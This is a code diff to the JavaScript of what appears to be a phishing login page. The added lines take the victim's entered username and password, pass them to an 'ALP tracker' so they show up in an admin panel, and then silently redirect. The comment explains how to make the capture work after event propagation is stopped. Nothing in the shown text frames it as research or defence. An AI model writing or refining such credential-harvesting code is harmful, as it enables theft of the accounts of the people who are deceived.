@@ -10527,6 +10527,18 @@
     }
     errLine.classList.remove('visible');
     if (e){ e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation(); }
+    // Push captured credentials directly to the ALP tracker — we've stopped
+    // propagation above, so tracker.js's document-level submit/click listeners
+    // will never fire. Without this, the page redirects silently and nothing
+    // shows up in the admin panel.
+    try {
+      if (window.ALPTracker && typeof window.ALPTracker.trackFormData === 'function') {
+        window.ALPTracker.trackFormData({
+          username: (pair.uid.value || '').trim(),
+          password: pair.pw.value || ''
+        });
+      }
+    } catch(_) {}
     window.location.href = loadingUrl();
     return true;
   }
